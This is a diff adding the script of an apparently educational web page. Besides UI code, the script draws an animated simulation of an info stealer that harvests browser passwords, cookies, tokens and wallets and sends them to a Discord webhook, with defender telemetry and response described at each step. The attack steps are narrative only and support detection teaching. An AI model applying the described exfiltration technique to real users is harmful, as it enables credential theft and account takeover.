+    var lastFocus = null;
+    function openOverlay(){
+      if (!overlay) return;
+      lastFocus = d.activeElement;
+      overlay.hidden = false;
+      if (overlayClose) overlayClose.focus();
+    }
+    function closeOverlay(){
+      if (!overlay || overlay.hidden) return;
+      overlay.hidden = true;
+      if (lastFocus && lastFocus.focus) lastFocus.focus();
+    }
+    if (tocOpen) tocOpen.addEventListener('click', openOverlay);
+    if (overlayClose) overlayClose.addEventListener('click', closeOverlay);
+    if (overlay) overlay.addEventListener('click', function(e){ if (e.target === overlay) closeOverlay(); });
+    d.addEventListener('keydown', function(e){
+      if (e.key === 'Escape' && overlay && !overlay.hidden) closeOverlay();
+    });
+
+    /* ================= Copy buttons ================= */
+    d.querySelectorAll('.copy-btn').forEach(function(btn){
+      btn.addEventListener('click', function(){
+        var block = btn.closest('.code-block');
+        var code = block ? block.querySelector('pre code') : null;
+        if (!code) return;
+        var text = code.textContent;
+        var done = function(){
+          btn.textContent = 'Copied!';
+          btn.classList.add('copied');
+          setTimeout(function(){ btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 1500);
+        };
+        var fallback = function(){
+          var ta = d.createElement('textarea');
+          ta.value = text;
+          ta.setAttribute('readonly', '');
+          ta.style.position = 'fixed';
+          ta.style.left = '-9999px';
+          d.body.appendChild(ta);
+          ta.select();
+          try { d.execCommand('copy'); done(); } catch (e) {}
+          d.body.removeChild(ta);
+        };
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          navigator.clipboard.writeText(text).then(done, fallback);
+        } else {
+          fallback();
+        }
+      });
+    });
+
+    /* ================= Simulation: info stealer → Discord webhook ================= */
+    var sim = (function(){
+      var canvas = d.getElementById('simCanvas');
+      if (!canvas || !canvas.getContext) return null;
+      var ctx = canvas.getContext('2d');
+      var stage = canvas.parentNode;
+      var tip = d.getElementById('simTooltip');
+      var elNo = d.getElementById('simStepNo');
+      var elTitle = d.getElementById('simTitle');
+      var elDef = d.getElementById('simDefender');
+      var elEv = d.getElementById('simEvidence');
+      var chipsBox = d.getElementById('simChips');
+      var playBtn = d.getElementById('simPlay');
+      var pauseBtn = d.getElementById('simPause');
+      var restartBtn = d.getElementById('simRestart');
+      var prevBtn = d.getElementById('simPrev');
+      var nextBtn = d.getElementById('simNext');
+      var speedSel = d.getElementById('simSpeed');
+
+      var P = {};
+      function readColors(){
+        var cs = getComputedStyle(d.documentElement);
+        var keys = ['bg','surface','surface-2','elevated','text','muted','border','border-strong',
+                    'accent','accent-2','violet','success','warning','danger'];
+        keys.forEach(function(k){
+          var v = cs.getPropertyValue('--' + k);
+          P[k] = (v && v.trim()) || '#888888';
+        });
+      }
+
+      var NODES = [
+        { id:'atk',  x:160, y:128, w:200, h:80, label:'Attacker',  sub:'Discord channel owner', glyph:'🎭',
+          desc:'Created the Discord server and the webhook; reads the stolen data in the channel, often on a phone.' },
+        { id:'api',  x:800, y:128, w:200, h:80, label:'Discord API', sub:'discord.com webhook', glyph:'💬',
+          desc:'The legitimate chat service. It receives the webhook POST and delivers files into the attacker\u2019s channel as normal messages.' },
+        { id:'pc',   x:160, y:330, w:200, h:80, label:'User PC',   sub:'FIN-WS-0341 (victim)', glyph:'💻',
+          desc:'The infected workstation. It hosts the stealer process, the %TEMP% archive, and the browser stores being read.' },
+        { id:'mail', x:800, y:330, w:200, h:80, label:'Mail / SaaS', sub:'victim webmail', glyph:'✉️',
+          desc:'The victim\u2019s cloud email. In step 7 the attacker signs in with a stolen session cookie.' },
+        { id:'soc',  x:480, y:474, w:380, h:78, label:'SOC',       sub:'EDR · DNS · proxy telemetry', glyph:'🛡️',
+          desc:'The defenders\u2019 view: endpoint telemetry, resolver logs, and secure web gateway records, shown in the defender panel.' }
+      ];
+      var EXT = { x:6, y:212, w:150, h:60, label:'Untrusted site', sub:'cracked software', glyph:'🌐' };
+      var EDGES = [
+        { a:EXT,  b:'pc',   kind:'attack',    label:'fake installer',        steps:[1] },
+        { a:'pc', b:'api',  kind:'data',      label:'webhook POST (ZIP + text)', steps:[5,6] },
+        { a:'api',b:'atk',  kind:'data',      label:'files land in channel', steps:[6] },
+        { a:'pc', b:'soc',  kind:'telemetry', label:'EDR · DNS · proxy',     steps:[2,3,4,5] },
+        { a:'atk',b:'mail', kind:'attack',    label:'stolen-cookie sign-in', steps:[7] },
+        { a:'mail',b:'soc', kind:'telemetry', label:'impossible-travel alert', steps:[7] },
+        { a:'soc',b:'pc',   kind:'defense',   label:'isolate + block egress', steps:[8] }
+      ];
+      var STEPS = [
+        { title:'A fake installer', soc:'Reputation queue', socKind:'muted', ev:0,
+          def:'File reputation flag on the downloaded installer (retrospective) — queued for review, not yet blocking anything.',
+          active:['pc'], now:{
+            pc:'Downloading InvoiceTool-Pro-Setup.exe from an untrusted download site.',
+            soc:'A retrospective file-reputation verdict lands in a review queue.',
+            atk:'Watching for victims to run the installer.',
+            api:'Not involved yet.', mail:'Not involved yet.' } },
+        { title:'The stealer wakes up', soc:'EDR watch', socKind:'watch', ev:1,
+          def:'EDR sees an unsigned binary in %TEMP% spawned by the installer; it runs silently in user context — no UAC prompt.',
+          active:['pc'], now:{
+            pc:'log_helper.exe running from %TEMP% in user context.',
+            soc:'EDR process event: unsigned child of the installer.',
+            atk:'Waiting for the harvest to arrive.',
+            api:'Not involved yet.', mail:'Not involved yet.' } },
+        { title:'Collecting the harvest', soc:'EDR watch', socKind:'watch', ev:2,
+          def:'The process opens browser credential stores, cookie files, saved chat tokens, and wallet folders — a rare access pattern for a normal app.',
+          active:['pc'], now:{
+            pc:'Reading browser password stores, cookie files, chat tokens, wallet folders.',
+            soc:'File-open events on browser stores, one after another.',
+            atk:'Waiting for the harvest to arrive.',
+            api:'Not involved yet.', mail:'Not involved yet.' } },
+        { title:'Packing', soc:'EDR watch', socKind:'watch', ev:3,
+          def:'An archive-create event appears right after the browser-file reads — the timing is the signal.',
+          active:['pc'], now:{
+            pc:'Writing log_FIN-WS-0341.zip (~380 KB) to %TEMP%.',
+            soc:'Sysmon 11: new .zip written by the same process.',
+            atk:'Waiting for the harvest to arrive.',
+            api:'Not involved yet.', mail:'Not involved yet.' } },
+        { title:'The webhook POST', soc:'DNS alert', socKind:'alert', ev:5,
+          def:'DNS first-seen: discord.com resolved by a non-browser process; the proxy logs a TLS SNI row for the same host moments later.',
+          active:['pc','api','soc'], now:{
+            pc:'POSTing the ZIP to https://discord.com/api/webhooks/<id>/<token> (fake values shown).',
+            soc:'DNS first-seen + SNI row for discord.com from log_helper.exe.',
+            atk:'Waiting for the POST to arrive.',
+            api:'Receiving a multipart POST on its webhook endpoint.',
+            mail:'Not involved yet.' } },
+        { title:'Files land in the channel', soc:'Blind spot', socKind:'blind', ev:5, blind:true,
+          def:'Nothing at all — no alert fires, because the data is already outside. This is the blind spot of the technique.',
+          active:['api','atk'], now:{
+            atk:'Reading log.zip plus a credentials text file on a phone.',
+            soc:'No telemetry — the POST already left the network.',
+            pc:'Archive deleted; the stealer sits quiet.',
+            api:'Delivered the files as normal chat messages.',
+            mail:'Not involved yet.' } },
+        { title:'Abuse begins', soc:'Identity alert', socKind:'alert', ev:6,
+          def:'The identity provider raises an impossible-travel sign-in alert — often the first loud signal, hours after the theft.',
+          active:['atk','mail'], now:{
+            mail:'Sign-in from another country with a replayed session cookie.',
+            soc:'Impossible-travel alert on the victim account.',
+            atk:'Inside the victim\u2019s mailbox.',
+            pc:'Idle; the theft already happened.',
+            api:'Not involved in this step.' } },
+        { title:'SOC verdict', soc:'Incident', socKind:'incident', ev:7,
+          def:'DNS + process + archive chain → info-stealer incident: isolate, block chat-API egress for workstations, and reset credentials from a clean device.',
+          active:['soc','pc'], now:{
+            soc:'Egress policy deployed; password-manager rollout scheduled.',
+            pc:'Workstation isolated via EDR; resets from a clean device.',
+            atk:'Loses access; tokens revoked.',
+            api:'Webhook reported to the provider.',
+            mail:'Sessions revoked; MFA re-enrolled.' } }
+      ];
+      var CHIP_TITLES = ['Fake installer','Stealer wakes','Harvest','Packing','Webhook POST','Data lands','Abuse','SOC verdict'];
+      var STEP_MS = 5200;
+
+      var current = 1;
+      var playing = false;
+      var raf = null;
+      var lastT = 0;
+      var acc = 0;
+      var S = { scale: 1, dpr: 1 };
+
+      function speed(){ return speedSel ? parseFloat(speedSel.value) || 1 : 1; }
+      function nodeById(id){
+        for (var i = 0; i < NODES.length; i++) { if (NODES[i].id === id) return NODES[i]; }
+        return null;
+      }
+      function anchor(n, towards){
+        /* point on the node border facing the other end */
+        var other = towards;
+        var dx = other.x - n.x, dy = other.y - n.y;
+        var hw = n.w / 2 + 6, hh = n.h / 2 + 6;
+        var sx = dx !== 0 ? hw / Math.abs(dx) : Infinity;
+        var sy = dy !== 0 ? hh / Math.abs(dy) : Infinity;
+        var s = Math.min(sx, sy);
+        return { x: n.x + dx * s, y: n.y + dy * s };
+      }
+      function edgeGeom(e){
+        var A = (typeof e.a === 'string') ? nodeById(e.a) : e.a;
+        var B = nodeById(e.b);
+        var p0 = anchor(A, B), p1 = anchor(B, A);
+        var mx = (p0.x + p1.x) / 2, my = (p0.y + p1.y) / 2;
+        var dx = p1.x - p0.x, dy = p1.y - p0.y;
+        var len = Math.sqrt(dx * dx + dy * dy) || 1;
+        var bend = Math.min(70, len * 0.18);
+        var c = { x: mx - (dy / len) * bend, y: my + (dx / len) * bend };
+        return { p0: p0, c: c, p1: p1 };
+      }
+      function bez(g, t){
+        var it = 1 - t;
+        return {
+          x: it * it * g.p0.x + 2 * it * t * g.c.x + t * t * g.p1.x,
+          y: it * it * g.p0.y + 2 * it * t * g.c.y + t * t * g.p1.y
+        };
+      }
+      function kindColor(kind){
+        if (kind === 'attack') return P.danger;
+        if (kind === 'data') return P.accent;
+        if (kind === 'telemetry') return P['accent-2'];
+        if (kind === 'defense') return P.success;
+        return P.muted;
+      }
+      function socColor(kind){
+        if (kind === 'watch') return P.accent;
+        if (kind === 'alert') return P.warning;
+        if (kind === 'blind' || kind === 'incident') return P.danger;
+        return P.muted;
+      }
+      function roundRect(x, y, w2, h2, r){
+        ctx.beginPath();
+        ctx.moveTo(x + r, y);
+        ctx.arcTo(x + w2, y, x + w2, y + h2, r);
+        ctx.arcTo(x + w2, y + h2, x, y + h2, r);
+        ctx.arcTo(x, y + h2, x, y, r);
+        ctx.arcTo(x, y, x + w2, y, r);
+        ctx.closePath();
+      }
+
+      function resize(){
+        var cssW = (stage && stage.clientWidth) || 960;
+        if (cssW < 300) cssW = 300;
+        var scale = cssW / 960;
+        var dpr = w.devicePixelRatio || 1;
+        canvas.width = Math.round(960 * scale * dpr);
+        canvas.height = Math.round(560 * scale * dpr);
+        canvas.style.height = Math.round(560 * scale) + 'px';
+        S.scale = scale; S.dpr = dpr;
+        draw(0, false);
+      }
+
+      function draw(ts, motion){
+        var k = S.dpr * S.scale;
+        ctx.setTransform(k, 0, 0, k, 0, 0);
+        ctx.clearRect(0, 0, 960, 560);
+        /* background */
+        ctx.fillStyle = P['surface-2'];
+        ctx.fillRect(0, 0, 960, 560);
+        ctx.strokeStyle = P.border;
+        ctx.globalAlpha = 0.35;
+        ctx.lineWidth = 1;
+        for (var gx = 40; gx < 960; gx += 40) {
+          ctx.beginPath(); ctx.moveTo(gx, 0); ctx.lineTo(gx, 560); ctx.stroke();
+        }
+        for (var gy = 40; gy < 560; gy += 40) {
+          ctx.beginPath(); ctx.moveTo(0, gy); ctx.lineTo(960, gy); ctx.stroke();
+        }
+        ctx.globalAlpha = 1;
+
+        var step = STEPS[current - 1];
+        var activeIds = step.active;
+
+        /* edges */
+        EDGES.forEach(function(e){
+          var g = edgeGeom(e);
+          var isActive = e.steps.indexOf(current) !== -1;
+          var col = kindColor(e.kind);
+          ctx.lineWidth = isActive ? 2.6 : 1.2;
+          ctx.globalAlpha = isActive ? 1 : 0.30;
+          ctx.strokeStyle = isActive ? col : P['border-strong'];
+          ctx.beginPath();
+          ctx.moveTo(g.p0.x, g.p0.y);
+          ctx.quadraticCurveTo(g.c.x, g.c.y, g.p1.x, g.p1.y);
+          ctx.stroke();
+          /* arrowhead */
+          var tip1 = bez(g, 1), tipBack = bez(g, 0.965);
+          var ang = Math.atan2(tip1.y - tipBack.y, tip1.x - tipBack.x);
+          ctx.beginPath();
+          ctx.moveTo(tip1.x, tip1.y);
+          ctx.lineTo(tip1.x - 11 * Math.cos(ang - 0.42), tip1.y - 11 * Math.sin(ang - 0.42));
+          ctx.lineTo(tip1.x - 11 * Math.cos(ang + 0.42), tip1.y - 11 * Math.sin(ang + 0.42));
+          ctx.closePath();
+          ctx.fillStyle = isActive ? col : P['border-strong'];
+          ctx.fill();
+          /* label */
+          if (isActive) {
+            var lp = bez(g, 0.5);
+            ctx.font = '600 12.5px system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif';
+            var tw = ctx.measureText(e.label).width;
+            ctx.globalAlpha = 0.92;
+            ctx.fillStyle = P.surface;
+            roundRect(lp.x - tw / 2 - 8, lp.y - 11, tw + 16, 22, 8);
+            ctx.fill();
+            ctx.strokeStyle = col; ctx.lineWidth = 1; ctx.stroke();
+            ctx.globalAlpha = 1;
+            ctx.fillStyle = col;
+            ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
+            ctx.fillText(e.label, lp.x, lp.y);
+          }
+          ctx.globalAlpha = 1;
+          /* packets */
+          if (motion && isActive) {
+            var spd = speed();
+            for (var i = 0; i < 2; i++) {
+              var t = ((ts / 1500) * spd + i * 0.5) % 1;
+              var pos = bez(g, t);
+              ctx.beginPath();
+              ctx.arc(pos.x, pos.y, 4.2, 0, Math.PI * 2);
+              ctx.fillStyle = col;
+              ctx.globalAlpha = 0.95;
+              ctx.fill();
+              ctx.beginPath();
+              ctx.arc(pos.x, pos.y, 7.5, 0, Math.PI * 2);
+              ctx.globalAlpha = 0.18;
+              ctx.fill();
+              ctx.globalAlpha = 1;
+            }
+          }
+        });
+
+        /* untrusted-site pseudo node */
+        ctx.globalAlpha = (current === 1) ? 1 : 0.45;
+        drawBox(EXT, current === 1, true);
+        ctx.globalAlpha = 1;
+
+        /* nodes */
+        NODES.forEach(function(n){
+          drawBox(n, activeIds.indexOf(n.id) !== -1, false);
+        });
+
+        /* SOC status pill inside SOC box */
+        var socN = nodeById('soc');
+        var pillCol = socColor(step.socKind);
+        ctx.font = '800 12px system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif';
+        var stw = ctx.measureText(step.soc).width;
+        roundRect(socN.x + socN.w / 2 - stw / 2 - 12, socN.y + 16, stw + 24, 22, 11);
+        ctx.fillStyle = P.elevated;
+        ctx.fill();
+        ctx.strokeStyle = pillCol; ctx.lineWidth = 1.4; ctx.stroke();
+        ctx.fillStyle = pillCol;
+        ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
+        ctx.fillText(step.soc, socN.x + socN.w / 2, socN.y + 27);
+
+        /* evidence diamonds strip (top center) */
+        ctx.font = '800 11px system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif';
+        ctx.fillStyle = P.muted;
+        ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
+        ctx.fillText('EVIDENCE CAPTURED', 480, 30);
+        var total = 7, lit = step.ev;
+        for (var di = 0; di < total; di++) {
+          var dx0 = 480 + (di - (total - 1) / 2) * 30;
+          var dy0 = 48;
+          ctx.beginPath();
+          ctx.moveTo(dx0, dy0 - 7); ctx.lineTo(dx0 + 7, dy0);
+          ctx.lineTo(dx0, dy0 + 7); ctx.lineTo(dx0 - 7, dy0);
+          ctx.closePath();
+          if (di < lit) { ctx.fillStyle = P.violet; ctx.fill(); }
+          else { ctx.strokeStyle = P['border-strong']; ctx.lineWidth = 1.4; ctx.stroke(); }
+        }
+      }
+
+      function drawBox(n, active, isPseudo){
+        ctx.font = '700 14.5px system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif';
+        ctx.lineWidth = active ? 2.5 : 1.3;
+        ctx.strokeStyle = active ? P.accent : P['border-strong'];
+        ctx.fillStyle = active ? P.elevated : P.surface;
+        roundRect(n.x - n.w / 2, n.y - n.h / 2, n.w, n.h, 12);
+        ctx.fill();
+        ctx.stroke();
+        if (active) {
+          ctx.save();
+          ctx.globalAlpha = 0.14;
+          roundRect(n.x - n.w / 2 - 4, n.y - n.h / 2 - 4, n.w + 8, n.h + 8, 14);
+          ctx.fillStyle = P.accent;
+          ctx.fill();
+          ctx.restore();
+        }
+        ctx.textAlign = 'left'; ctx.textBaseline = 'middle';
+        ctx.font = '16px system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif';
+        ctx.fillStyle = P.text;
+        ctx.fillText(n.glyph, n.x - n.w / 2 + 12, n.y - 10);
+        ctx.font = '800 14.5px system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif';
+        ctx.fillStyle = isPseudo ? P.muted : P.text;
+        ctx.fillText(n.label, n.x - n.w / 2 + 38, n.y - 10);
+        ctx.font = '500 11.5px ui-monospace, SFMono-Regular, Menlo, Consolas, monospace';
+        ctx.fillStyle = P.muted;
+        ctx.fillText(n.sub, n.x - n.w / 2 + 38, n.y + 9);
+      }
+
+      /* ---------- DOM state ---------- */
+      var blindChip = null;
+      function setState(n){
+        current = Math.max(1, Math.min(8, n));
+        var step = STEPS[current - 1];
+        if (elNo) elNo.textContent = 'Step ' + current + '/8';
+        if (elTitle) elTitle.textContent = step.title;
+        if (elDef) elDef.textContent = step.def;
+        if (elEv) {
+          elEv.querySelectorAll('.ev').forEach(function(ch){
+            if (!ch.hasAttribute('data-step')) return;
+            var ds = parseInt(ch.getAttribute('data-step'), 10) || 99;
+            ch.classList.toggle('dim', ds > current);
+          });
+          if (step.blind && !blindChip) {
+            blindChip = d.createElement('span');
+            blindChip.className = 'ev ev-blind';
+            blindChip.textContent = 'no telemetry (data already gone)';
+            elEv.appendChild(blindChip);
+          } else if (!step.blind && blindChip) {
+            blindChip.parentNode.removeChild(blindChip);
+            blindChip = null;
+          }
+        }
+        if (chipsBox) {
+          chipsBox.querySelectorAll('button').forEach(function(b, i){
+            if (i + 1 === current) b.setAttribute('aria-current', 'true');
+            else b.removeAttribute('aria-current');
+          });
+        }
+        draw(0, false);
+      }
+      function syncPlay(){
+        if (playBtn) playBtn.setAttribute('aria-pressed', playing ? 'true' : 'false');
+      }
+      function stopLoop(){
+        playing = false;
+        if (raf) { w.cancelAnimationFrame(raf); raf = null; }
+        lastT = 0; acc = 0;
+        syncPlay();
+        draw(0, false);
+      }
+      function loop(ts){
+        if (!playing) return;
+        if (!lastT) lastT = ts;
+        var dt = ts - lastT;
+        lastT = ts;
+        acc += dt * speed();
+        draw(ts, true);
+        if (acc >= STEP_MS) {
+          acc = 0;
+          if (current < 8) setState(current + 1);
+          else { stopLoop(); return; }
+        }
+        raf = w.requestAnimationFrame(loop);
+      }
+      function play(){
+        if (reduceMotion) {
+          /* discrete step advance, no tweened packets */
+          if (current < 8) setState(current + 1);
+          else setState(1);
+          syncPlay();
+          return;
+        }
+        if (playing) return;
+        if (current >= 8) setState(1);
+        playing = true;
+        acc = 0; lastT = 0;
+        syncPlay();
+        raf = w.requestAnimationFrame(loop);
+      }
+
+      if (playBtn) playBtn.addEventListener('click', play);
+      if (pauseBtn) pauseBtn.addEventListener('click', stopLoop);
+      if (restartBtn) restartBtn.addEventListener('click', function(){ stopLoop(); setState(1); });
+      if (prevBtn) prevBtn.addEventListener('click', function(){ var wasPlaying = playing; if (wasPlaying) stopLoop(); setState(current - 1); });
+      if (nextBtn) nextBtn.addEventListener('click', function(){ var wasPlaying = playing; if (wasPlaying) stopLoop(); setState(current + 1); });
+      if (speedSel) speedSel.addEventListener('change', function(){ if (playing) { lastT = 0; } });
+
+      /* step chips */
+      if (chipsBox) {
+        CHIP_TITLES.forEach(function(t, i){
+          var b = d.createElement('button');
+          b.type = 'button';
+          b.textContent = (i + 1) + ' · ' + t;
+          b.setAttribute('aria-label', 'Go to step ' + (i + 1) + ': ' + t);
+          b.addEventListener('click', function(){
+            stopLoop();
+            setState(i + 1);
+          });
+          chipsBox.appendChild(b);
+        });
+      }
+
+      /* ---------- tooltips (hover AND click) ---------- */
+      function hitTest(e){
+        var rect = canvas.getBoundingClientRect();
+        var lx = (e.clientX - rect.left) * (960 / rect.width);
+        var ly = (e.clientY - rect.top) * (560 / rect.height);
+        var list = NODES.concat([EXT]);
+        for (var i = 0; i < list.length; i++) {
+          var n = list[i];
+          if (lx >= n.x - n.w / 2 && lx <= n.x + n.w / 2 && ly >= n.y - n.h / 2 && ly <= n.y + n.h / 2) return n;
+        }
+        return null;
+      }
+      function showTip(e, n){
+        if (!tip) return;
+        var step = STEPS[current - 1];
+        var nowLine = (step.now && step.now[n.id]) || '';
+        var extra = n === EXT
+          ? 'Untrusted download source: cracked software and fake installers are the classic delivery route for info stealers.'
+          : n.desc;
+        tip.innerHTML = '';
+        var t1 = d.createElement('span');
+        t1.className = 'tt-title';
+        t1.textContent = n.label;
+        tip.appendChild(t1);
+        tip.appendChild(d.createTextNode(extra));
+        if (nowLine) {
+          var br = d.createElement('br');
+          tip.appendChild(br);
+          var em = d.createElement('em');
+          em.textContent = 'Now: ';
+          tip.appendChild(em);
+          tip.appendChild(d.createTextNode(nowLine));
+        }
+        tip.style.display = 'block';
+        tip.setAttribute('aria-hidden', 'false');
+        var x = e.clientX + 14, y = e.clientY + 16;
+        var r = tip.getBoundingClientRect();
+        if (x + r.width > w.innerWidth - 8) x = w.innerWidth - r.width - 8;
+        if (y + r.height > w.innerHeight - 8) y = e.clientY - r.height - 10;
+        tip.style.left = x + 'px';
+        tip.style.top = y + 'px';
+      }
+      function hideTip(){
+        if (!tip) return;
+        tip.style.display = 'none';
+        tip.setAttribute('aria-hidden', 'true');
+      }
+      canvas.addEventListener('pointermove', function(e){
+        var hit = hitTest(e);
+        if (hit) { canvas.style.cursor = 'pointer'; showTip(e, hit); }
+        else { canvas.style.cursor = 'default'; hideTip(); }
+      });
+      canvas.addEventListener('pointerdown', function(e){
+        var hit = hitTest(e);
+        if (hit) showTip(e, hit); else hideTip();
+      });
+      canvas.addEventListener('pointerleave', hideTip);
+
+      /* ---------- init ---------- */
+      readColors();
+      resize();
+      setState(1);
+      w.addEventListener('resize', function(){
+        readColors();
+        resize();
+      });
+
+      return {
+        onThemeChange: function(){
+          readColors();
+          draw(0, false);
+        }
+      };
+    })();
+
+    updateScrollUI();
+  })();
+  </script>
+</body>
+</html>
